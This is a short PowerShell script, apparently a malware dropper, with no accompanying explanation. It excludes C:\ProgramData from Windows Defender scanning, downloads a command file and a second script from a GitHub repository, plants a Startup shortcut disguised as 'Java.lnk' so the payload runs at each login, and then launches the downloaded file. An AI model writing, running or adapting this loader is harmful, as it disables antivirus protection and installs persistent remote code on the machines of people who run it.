Set-MpPreference -ExclusionPath C:\ProgramData
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$down = New-Object System.Net.WebClient
$url = 'https://github.com/qwertyuiopindia/test/raw/main/AW_prod.cmd?raw=true'
$file = "C:\ProgramData\AW_prod.cmd"
$down.DownloadFile($url,$file)
$objShell = New-Object -ComObject ("WScript.Shell")
$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java.lnk")
$objShortCut.TargetPath="C:\ProgramData\AW_prod.cmd"
$objShortCut.Save()
$down = New-Object System.Net.WebClient
$url2 = 'https://github.com/qwertyuiopindia/test/raw/main/script.ps1?raw=true'
$file2 = "C:\ProgramData\script.ps1"
$down.DownloadFile($url2,$file2)
$file = "C:\ProgramData\AW_prod.cmd"
$exec = New-Object -com shell.application
$exec.shellexecute($file)
exit

